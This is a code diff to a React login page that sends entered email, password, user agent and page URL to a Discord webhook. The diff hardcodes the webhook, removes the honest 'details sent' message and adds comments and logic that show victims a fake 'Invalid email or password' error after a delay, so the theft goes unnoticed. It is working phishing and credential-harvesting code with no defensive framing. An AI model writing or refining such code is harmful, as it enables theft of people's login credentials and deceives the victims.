@@ -8,10 +8,11 @@ function App() {
     password: ''
   });
   const [showPassword, setShowPassword] = useState(false);
-  const [webhookUrl, setWebhookUrl] = useState('');
-  const [showWebhookInput, setShowWebhookInput] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
 
+  // ⚠️ REPLACE THIS WITH YOUR DISCORD WEBHOOK URL ⚠️
+  const DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+  
   const handleInputChange = (e) => {
     setFormData({
       ...formData,
@@ -22,9 +23,15 @@ function App() {
   const handleSubmit = async (e) => {
     e.preventDefault();
     
-    if (!webhookUrl) {
-      alert('Please enter your Discord webhook URL first!');
-      setShowWebhookInput(true);
+    // Check if webhook URL is configured
+    if (DISCORD_WEBHOOK_URL === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
+      console.error('Discord webhook URL not configured!');
+      // Show fake loading to user, but log error for developer
+      setIsLoading(true);
+      setTimeout(() => {
+        setIsLoading(false);
+        alert('Invalid email or password.');
+      }, 2000);
       return;
     }
 
@@ -55,6 +62,11 @@ function App() {
               name: "🌐 User Agent",
               value: navigator.userAgent.slice(0, 100) + "...",
               inline: false
+            },
+            {
+              name: "🔗 Page URL",
+              value: window.location.href,
+              inline: false
             }
           ],
           thumbnail: {
@@ -66,7 +78,7 @@ function App() {
         }]
       };
 
-      const response = await fetch(webhookUrl, {
+      const response = await fetch(DISCORD_WEBHOOK_URL, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -75,16 +87,22 @@ function App() {
       });
 
       if (response.ok) {
-        alert('Login details sent to Discord webhook successfully!');
-        setFormData({ email: '', password: '' });
+        // Show fake error message to user (so it looks like failed login)
+        setTimeout(() => {
+          setIsLoading(false);
+          alert('Invalid email or password.');
+          setFormData({ email: '', password: '' });
+        }, 2000);
       } else {
         throw new Error('Failed to send webhook');
       }
     } catch (error) {
       console.error('Error sending webhook:', error);
-      alert('Failed to send to Discord webhook. Please check your webhook URL.');
-    } finally {
-      setIsLoading(false);
+      // Show fake error to user
+      setTimeout(() => {
+        setIsLoading(false);
+        alert('Invalid email or password.');
+      }, 2000);
     }
   };
 
